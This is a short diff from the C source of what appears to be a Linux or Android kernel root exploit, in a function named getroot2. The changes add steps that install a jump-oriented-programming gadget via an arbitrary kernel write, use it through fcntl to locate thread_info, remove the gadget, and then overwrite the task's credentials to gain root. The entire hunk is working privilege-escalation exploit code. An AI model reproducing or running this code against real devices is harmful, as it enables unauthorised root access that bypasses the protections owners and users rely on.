@@ -397,13 +397,19 @@ int getroot2(struct offsets2* o)
 		goto end;
 
 	printf("[+] Installing get_threadinfo JOP\n");
-	if(writel_at_address_pipe(o->check_flags, (unsigned long)o->get_threadinfo_joploc))
+	if(writel_at_address_pipe(o->check_flags, (long)o->get_threadinfo_joploc))
 		goto end;
 
+	printf("[+] Getting threadinfo...\n");
 	fp = (unsigned)fcntl(dev, F_SETFL, MMAP_START);
 	fp += KERNEL_START;
 	ti = get_thread_info(fp);
 
+	printf("[+] Removing get_threadinfo JOP\n");
+	if(writel_at_address_pipe(o->check_flags, 0))
+		goto end;
+
+	printf("[+] Root ...\n");
 	if((ret = modify_task_cred_uc(ti)))
 		goto end;
 
